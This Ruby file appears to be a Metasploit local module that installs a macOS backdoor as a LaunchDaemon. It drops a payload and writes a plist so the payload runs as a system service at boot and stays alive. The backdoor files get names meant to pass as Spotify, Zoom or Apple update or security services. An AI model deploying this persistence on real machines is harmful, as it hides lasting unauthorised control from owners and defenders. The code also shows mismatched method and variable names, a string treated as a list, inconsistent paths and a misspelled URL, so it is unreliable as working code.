##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# download Objective C tools and test

class MetasploitModule < Msf::Exploit::Local

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OSX Launch Daemon Payload Installer',
        'Description' => %q{
          This module provides persistence by writing a plist file to /Library/LaunchDaemons/ .
          The plist entry will trigger a payload during system initialization before a user 
          logs in. The payload will operate at the system level regardless of the user who logs in.  
        },
        'License' => MSF_LICENSE,
        'References' => [
          # OSX Malware Persistence, thanks Patrick Wardle
          [ 'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf' ],
          # Apples official Launch Agent & Launch Daemon docs
          ['URL', 'https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html']
        ],
        'Author' => 'gardnerapp',
        'Targets' => [
          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],
          [ 'Mac OS X x86 (Native Payload for 10.14 and earlier)', { 'Arch' => ARCH_X86, 'Platform' => [ 'osx' ] } ],
          [ 'Mac OS X Silicon', { 'Arch' => ARCH_ARMLE, 'Platform' => ['osx'] } ],
          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],
          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],
        ],
        'SessionTypes' => [ 'shell', 'meterpreter' ]
      )
    )
  end

  register_options([
    OptString.new('BACKDOOR_PATH', [
      false, 'Path to the backdoor, will be set to /Users/Shared/<random> as default ',
      '/Users/Shared/<random>'
    ]),
    OptBool.new('RUN_NOW', [
      false, "When set to true the daemon will run as soon as it is
		loaded. If false it will run the next time launchd boots or when the user manually
		loads the lanuchd item via the command \'launchctl load -w /Library/LaunchDaemons/<file>.plist\'",
      false
    ]),
    OptBool.new('KEEP_ALIVE', [
      false, 'Keep Alive is a plist property. When true the daemon will be running at all times.
    		When set to false the daemon needs to be launched on demand i.e. manually. The default
    		is true.',
      true
    ])
  ])

  def exploit
    check_duplicate_daemon

    if target['Arch'] == ARCH_PYTHON
      payload_bin = "#!/usr/bin/env python\n" + payload.encoded
    elsif target['Arch'] == ARCH_CMD
      payload_bin = "#!/usr/bin/env bash\n" + payload.raw
    else
      payload_bin = generate_payload_exe
    end

    # Store the backdoor on the target
    write_backdoor(payload_bin)

    # Create a launch Daemon to spawn backdoor
    add_lanuch_daemon

    # List removal details
    removal_details
  end

  # raises an error if the launch daemon plist file already exists
  def check_duplicate_daemon
    if file?(daemon_path)
      fail_with('FileError', "A Launch Daemon #{daemon_path} already exists.")
    end
  end

  def daemon_path
    @daemon_path = "/Users/Shared/#{File.basename(backdoor_path)}.plist"
  end

  def backdoor_path
    generate_random_name
    @backdoor_path = datastore['BACKDOOR_PATH'].gsub('<random>', @randomn_name)
  end

  def random_name
    @random_name = generate_random_name
  end

  def generate_random_name
    names = %q{
  		msfbackdoor
  		spotify
  		zoom
  		google
  		apple
  	}

    labels = %w[
      security updates analytics important
      networking monitoring provisioning troubleshooting
    ]
    names.sample.concat(labels.sample)
  end

  # writes file to disk and sets execute permissions
  def write_backdoor(exe)
    location = File.dirname(backdoor_path).shellescape
    print_status 'Writing backdoor executable to disk'
    cmd_exec "mkdir -p #{location}"

    if write_file(backdoor_path, exe)
      print_good "Backdoor successfully dropped at #{location}"
      print_status 'Setting execute permissions...'
      cmd_exec "chmod +x #{backdoor_path.shellescape}"
    else
      fail_with(Failure::UnexpectedReply, "Error dropping backdoor to #{backdoor_path}")
    end
  end

  def keep_alive
    @keep_alive = datastore['KEEP_ALIVE']
  end

  def add_launch_daemon
    label = File.basename(backdoor_path)
    cmd_exec("mkdir -p #{File.dirname(plist_path).shellescape}")
    # OnDemand was deprecated in OSX 10.4 but is kept here for backwards compatibility,
    # it was replaced with the KeepAlive key, which is why both of these values will
    # hold the same boolean.
    xml = <<-EOI
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appple.com/DTDs/PropertyList-1.0.dtd">
		<plist version="1.0">
			<dict>
				<key>Label</key>
				<string>#{label}</string>
				<key>ProgramArguments</key>
				<array>
					<string>#{@backdoor_path}</string>
				</array>
				<key>RunAtLoad</key>
				<true/>
				<key>OnDemand</key>
				<#{@keep_alive}/>
				<key>KeepAlive</key>
				<#{@keep_alive}/>
			</dict>
		</plist>
    EOI

    if write_file(plist_path, xml)
      print_good("Launch Daemon added: #{plist_path}")
    else
      fail_with(Failure::UnexpectedReply, "Error writing LaunchDaemon to #{plist_path}")
    end

    # -w flag does the following:
    # Overrides the Disabled key and sets it to false or true for the load
    # and unload subcommands respectively"
    cmd_exec("launchctl load -w #{plist_path.shellescape}") if run_now?

    print_good('Launch Daemon has been installed !')
  end

  # This is where launchctl finds the daemons config file
  def plist_path
    @plist_path = "/Library/LaunchDaemons/#{File.basename(backdoor_path)}.plist"
  end

  def removal_details
    # remove the executable
    remove = "rm -rf #{File.dirname(backdoor_path).shellescape}"
    # remove the launch daemon configuration file
    remove << "; rm #{plist_path}"
    # shut the running service off, if it is ondemand it will just reboot.
    remove << "; launchctl stop #{File.basename(backdoor_path)}"
    # remove the lob from launchd by its labels
    remove << "; launchctl remove #{File.basename(backdoor_path)}"

    print_status("To remove the executable run: #{remove}\n")
  end
end
